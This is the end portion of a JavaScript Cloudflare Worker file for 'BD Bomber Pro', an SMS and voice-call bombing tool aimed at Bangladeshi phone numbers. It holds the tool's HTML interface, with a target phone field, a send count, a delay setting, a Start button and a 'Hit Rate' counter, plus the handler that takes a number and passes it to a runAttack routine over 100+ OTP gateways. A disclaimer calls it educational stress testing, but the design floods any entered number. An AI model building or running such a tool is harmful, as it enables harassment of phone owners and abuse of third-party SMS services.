.al{display:inline-flex;align-items:center;gap:5px;padding:4px 9px;background:var(--surface2);border:1px solid var(--border);border-radius:6px;font-size:.67rem;color:var(--muted);text-decoration:none;transition:all .2s;font-weight:500;}
.al:hover{border-color:var(--primary);color:var(--primary);}
.foot{position:relative;z-index:1;border-top:1px solid var(--border);padding:24px 5%;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;}
.fc{font-size:.73rem;color:var(--muted);}
.fc strong{color:var(--text);}
.fr{display:flex;gap:7px;}
.fb{font-size:.62rem;padding:3px 9px;border-radius:5px;background:var(--surface2);border:1px solid var(--border);color:var(--muted);font-weight:600;}
.si{display:inline-flex;align-items:center;gap:5px;font-size:.7rem;font-weight:600;padding:4px 10px;border-radius:20px;background:rgba(52,211,153,.1);border:1px solid rgba(52,211,153,.2);color:var(--success);transition:all .3s;margin-top:12px;}
.si.active{background:rgba(79,142,247,.12);border-color:rgba(79,142,247,.25);color:var(--primary);}
.sd{width:6px;height:6px;border-radius:50%;background:currentColor;}
.si.active .sd{animation:pulse 1s infinite;}
.tc-cont{position:fixed;bottom:22px;right:22px;z-index:999;display:flex;flex-direction:column;gap:7px;}
.toast{padding:11px 16px;background:var(--surface2);border:1px solid var(--border2);border-radius:11px;font-size:.8rem;color:var(--text);display:flex;align-items:center;gap:8px;box-shadow:0 8px 22px rgba(0,0,0,.4);animation:ti .3s ease;min-width:240px;}
@keyframes ti{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
.toast.tok{border-color:rgba(52,211,153,.3)}.toast.terr{border-color:rgba(248,113,113,.3)}
.toast.tok i{color:var(--success)}.toast.terr i{color:var(--danger)}
::-webkit-scrollbar{width:5px;height:5px}::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
</style>
</head>
<body>
<div class="wb"><i class="fas fa-exclamation-triangle"></i> &nbsp;<strong>⚠ EDUCATIONAL PURPOSE ONLY</strong> — For authorized security research only. Unauthorized use is <strong>ILLEGAL</strong>.</div>
<nav class="nav">
  <a class="brand" href="#"><div class="bicon"><i class="fas fa-broadcast-tower"></i></div><span class="bname">BD <span>Bomber</span> Pro</span></a>
  <div style="display:flex;gap:8px;align-items:center;">
    <span style="padding:4px 10px;border-radius:20px;font-size:.65rem;font-weight:600;letter-spacing:.5px;text-transform:uppercase;background:rgba(52,211,153,.15);color:var(--success);border:1px solid rgba(52,211,153,.25);">Live</span>
    <span id="apiBadge" style="padding:4px 10px;border-radius:20px;font-size:.65rem;font-weight:600;letter-spacing:.5px;text-transform:uppercase;background:rgba(79,142,247,.15);color:var(--primary);border:1px solid rgba(79,142,247,.25);">100+ APIs</span>
  </div>
  <div class="nsoc">
    <a href="https://www.facebook.com/share/1BdstyBhqM/" target="_blank"><i class="fab fa-facebook-f"></i></a>
    <a href="https://t.me/Otakuosenpai" target="_blank"><i class="fab fa-telegram-plane"></i></a>
    <a href="https://github.com/salman-dev-app" target="_blank"><i class="fab fa-github"></i></a>
    <a href="mailto:mdsalmanhelp@gmail.com"><i class="fas fa-envelope"></i></a>
    <a href="https://wa.me/8801840933137" target="_blank"><i class="fab fa-whatsapp"></i></a>
  </div>
</nav>
<section class="hero">
  <div class="eyebrow">Cloudflare Worker Edition v4.0</div>
  <h1>Bangladesh <span class="grad">SMS &amp; Call</span><br/>Stress Testing Suite</h1>
  <p>100+ OTP gateway &amp; rate-limit tester for BD. Built for security professionals.</p>
  <div class="hstats">
    <div class="hs"><span class="hs-v">100+</span><span class="hs-l">API Gateways</span></div>
    <div class="hs"><span class="hs-v">BD</span><span class="hs-l">Region</span></div>
    <div class="hs"><span class="hs-v">SMS+Call</span><span class="hs-l">Modes</span></div>
  </div>
</section>
<div class="dis">
  <div class="di"><i class="fas fa-shield-alt"></i></div>
  <div>
    <h4>LEGAL DISCLAIMER &amp; TERMS OF USE</h4>
    <p>This tool is for <strong>educational, research, and authorized security testing ONLY</strong>. Only test systems and numbers <strong>you own or have explicit permission to test</strong>. Sending unsolicited messages is a criminal offense. Developer <strong>Md Salman Biswas</strong> holds <strong>NO responsibility</strong> for any misuse. <strong>Do NOT use for harassment, spam, or any illegal activity.</strong></p>
  </div>
</div>
<div class="wrap">
  <div>
    <div class="card">
      <div class="ct"><i class="fas fa-sliders-h"></i> Control Panel</div>
      <div class="tabs">
        <button class="tab active" id="tabSMS" onclick="setMode('sms')"><i class="fas fa-comment-dots"></i> SMS</button>
        <button class="tab" id="tabCall" onclick="setMode('call')"><i class="fas fa-phone"></i> Voice Call</button>
      </div>
      <div class="field">
        <label>Target Phone (BD)</label>
        <div class="iw"><i class="fas fa-mobile-alt"></i><input id="num" type="tel" placeholder="01XXXXXXXXX" maxlength="11"/></div>
      </div>
      <div class="field">
        <label>Send Count</label>
        <div class="iw rw"><i class="fas fa-layer-group" style="left:13px;z-index:1;"></i><input id="count" type="number" value="30" min="1" max="200" style="padding-left:37px;" oninput="document.getElementById('cb').textContent=this.value"/><div class="rb" id="cb">30</div></div>
      </div>
      <div class="field">
        <label>Delay (ms)</label>
        <div class="iw"><i class="fas fa-clock"></i><input id="delay" type="number" value="200" min="50" max="3000"/></div>
      </div>
      <div class="brow">
        <button class="btn btn-p" id="btnS" onclick="launch()"><i class="fas fa-rocket"></i> Start</button>
        <button class="btn btn-d" id="btnX" onclick="abort()" style="display:none;"><i class="fas fa-stop-circle"></i> Stop</button>
      </div>
      <div class="sg">
        <div class="st ss"><span class="sv" id="stS">0</span><span class="sl">Sent</span></div>
        <div class="st su"><span class="sv" id="stOk">0</span><span class="sl">Success</span></div>
        <div class="st sf"><span class="sv" id="stF">0</span><span class="sl">Failed</span></div>
        <div class="st sr"><span class="sv" id="stR">0%</span><span class="sl">Hit Rate</span></div>
      </div>
      <div class="pw">
        <div class="ph"><span>Progress</span><span id="pLabel">0 / 0</span></div>
        <div class="pb"><div class="pf" id="pFill"></div></div>
      </div>
    </div>
    <div style="text-align:center;">
      <div class="si" id="sInd"><div class="sd"></div><span id="sTxt">System Ready</span></div>
    </div>
  </div>
  <div class="rp">
    <div class="card">
      <div class="th">
        <div style="display:flex;align-items:center;gap:10px;"><div class="tdots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div><span style="font-size:.63rem;color:var(--muted);letter-spacing:1px;text-transform:uppercase;">Operation Logs</span></div>
        <button class="tc" onclick="clrLogs()"><i class="fas fa-trash"></i> Clear</button>
      </div>
      <div class="tb" id="con">
        <div class="ll info"><span class="lt">--:--:--</span><span class="lm"><b>[SYS]</b> BD Bomber Pro v4.0 (Cloudflare Worker) — Initialized.</span></div>
      </div>
    </div>
    <div class="card">
      <div class="ct"><i class="fas fa-user-circle"></i> Developer</div>
      <div class="ac">
        <div class="av">SB</div>
        <div class="ai">
          <div class="an">Md Salman Biswas</div>
          <div class="ar">Security Researcher &amp; Full-Stack Developer</div>
          <div class="als">
            <a class="al" href="https://github.com/salman-dev-app" target="_blank"><i class="fab fa-github"></i> salman-dev-app</a>
            <a class="al" href="mailto:mdsalmanhelp@gmail.com"><i class="fas fa-envelope"></i> Email</a>
            <a class="al" href="https://wa.me/8801840933137" target="_blank"><i class="fab fa-whatsapp"></i> WhatsApp</a>
            <a class="al" href="https://www.facebook.com/share/1BdstyBhqM/" target="_blank"><i class="fab fa-facebook-f"></i> Facebook</a>
            <a class="al" href="https://t.me/Otakuosenpai" target="_blank"><i class="fab fa-telegram-plane"></i> Telegram</a>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>
<footer class="foot">
  <div class="fc">&copy; 2024–2026 <strong>Md Salman Biswas</strong> · <a href="https://github.com/salman-dev-app/sms-bomber" target="_blank" style="color:var(--muted);text-decoration:none;">GitHub Repo</a></div>
  <div class="fr"><span class="fb">MIT License</span><span class="fb">Educational Only</span><span class="fb">v4.0</span><span class="fb">Cloudflare Worker</span></div>
</footer>
<div class="tc-cont" id="tCont"></div>
<script>
let mode='sms', running=false;
function setMode(m){mode=m;document.getElementById('tabSMS').classList.toggle('active',m==='sms');document.getElementById('tabCall').classList.toggle('active',m==='call');}
function toast(msg,t='ok'){const c=document.getElementById('tCont');const el=document.createElement('div');el.className='toast t'+t;el.innerHTML='<i class="fas fa-'+(t==='ok'?'check-circle':'exclamation-circle')+'"></i><span>'+msg+'</span>';c.appendChild(el);setTimeout(()=>el.remove(),3200);}
function clrLogs(){document.getElementById('con').innerHTML='';}
function addLog(msg,cls=''){const c=document.getElementById('con');const now=new Date().toLocaleTimeString('en-GB');let pre='[INFO]';if(msg.includes('STRIKE')||msg.includes('success'))cls='success',pre='[OK]';else if(msg.includes('FAIL')||msg.includes('error'))cls='error',pre='[ERR]';else if(msg.includes('MISS'))cls='warn',pre='[WARN]';else if(msg.includes('SYS')||msg.includes('SYSTEM'))cls='info',pre='[SYS]';const d=document.createElement('div');d.className='ll '+cls;d.innerHTML='<span class="lt">'+now+'</span><span class="lm"><b>'+pre+'</b> '+msg+'</span>';c.insertBefore(d,c.firstChild);if(c.children.length>40)c.removeChild(c.lastChild);}
function setStatus(a){const i=document.getElementById('sInd');i.classList.toggle('active',a);document.getElementById('sTxt').textContent=a?'Running…':'System Ready';}
async function launch(){
  const n=document.getElementById('num').value.trim();
  const cnt=parseInt(document.getElementById('count').value)||30;
  const dly=parseInt(document.getElementById('delay').value)||200;
  if(!/^01[3-9]\\d{8}$/.test(n)){toast('Invalid BD number (01XXXXXXXXX)','err');return;}
  if(running){toast('Already running!','err');return;}
  running=true;setStatus(true);
  document.getElementById('btnS').style.display='none';
  document.getElementById('btnX').style.display='block';
  document.getElementById('stS').textContent='0';document.getElementById('stOk').textContent='0';
  document.getElementById('stF').textContent='0';document.getElementById('stR').textContent='0%';
  document.getElementById('pFill').style.width='0%';document.getElementById('pLabel').textContent='0 / 0';
  addLog('SYSTEM: Launching — Target:'+n+' Count:'+cnt+' Mode:'+mode.toUpperCase(),'info');
  toast('Operation launched on '+n,'ok');
  try{
    const res=await fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({num:n,count:cnt,delay:dly,mode})});
    const d=await res.json();
    document.getElementById('stS').textContent=d.sent||0;
    document.getElementById('stOk').textContent=d.success||0;
    document.getElementById('stF').textContent=(d.sent||0)-(d.success||0);
    const r=d.sent>0?Math.round((d.success/d.sent)*100):0;
    document.getElementById('stR').textContent=r+'%';
    document.getElementById('pFill').style.width='100%';
    document.getElementById('pLabel').textContent=d.sent+' / '+d.sent;
    if(d.logs)d.logs.forEach(l=>addLog(l.msg,l.type==='success'?'success':l.type==='error'?'error':l.type==='warn'?'warn':'info'));
    addLog('SYSTEM: Complete — '+d.success+'/'+d.sent+' success.','info');
    toast('Operation finished!','ok');
  }catch(e){addLog('FAIL: '+e.message,'error');toast('Request failed','err');}
  finally{running=false;setStatus(false);document.getElementById('btnS').style.display='block';document.getElementById('btnX').style.display='none';}
}
function abort(){running=false;setStatus(false);document.getElementById('btnS').style.display='block';document.getElementById('btnX').style.display='none';addLog('SYSTEM: Aborted by user.','warn');toast('Stopped','ok');}
</script>
</body>
</html>`;

// ─────────────────────────────────────────────────────────────
//  REQUEST HANDLER
// ─────────────────────────────────────────────────────────────
export default {
  async fetch(request) {
    const url = new URL(request.url);

    // CORS headers
    const cors = {
      "Access-Control-Allow-Origin":  "*",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    };

    if (request.method === "OPTIONS") {
      return new Response(null, { status: 204, headers: cors });
    }

    // ── GET /  → serve the HTML UI
    if (request.method === "GET" && url.pathname === "/") {
      return new Response(PAGE_HTML, {
        headers: { "Content-Type": "text/html; charset=utf-8", ...cors },
      });
    }

    // ── GET /health  → service health check
    if (request.method === "GET" && url.pathname === "/health") {
      return new Response(
        JSON.stringify({ status: "ok", version: "4.0", sms_apis: SMS_APIS.length, call_apis: CALL_APIS.length }),
        { headers: { "Content-Type": "application/json", ...cors } }
      );
    }

    // ── POST /attack  → run the attack
    if (request.method === "POST" && url.pathname === "/attack") {
      let body;
      try { body = await request.json(); }
      catch { return new Response(JSON.stringify({ error: "Invalid JSON" }), { status: 400, headers: cors }); }

      const number = String(body.num || "").trim();
      const count  = Math.min(parseInt(body.count) || 30, 200);
      const delay  = Math.max(50, parseInt(body.delay) || 200);
      const mode   = String(body.mode || "sms").toLowerCase();

      if (!/^01[3-9]\d{8}$/.test(number)) {
        return new Response(
          JSON.stringify({ error: "Invalid Bangladesh phone number" }),
          { status: 400, headers: { "Content-Type": "application/json", ...cors } }
        );
      }

      const result = await runAttack(number, count, mode, delay);

      return new Response(JSON.stringify({ ...result, status: "complete" }), {
        headers: { "Content-Type": "application/json", ...cors },
      });
    }

    return new Response("Not Found", { status: 404, headers: cors });
  },
};
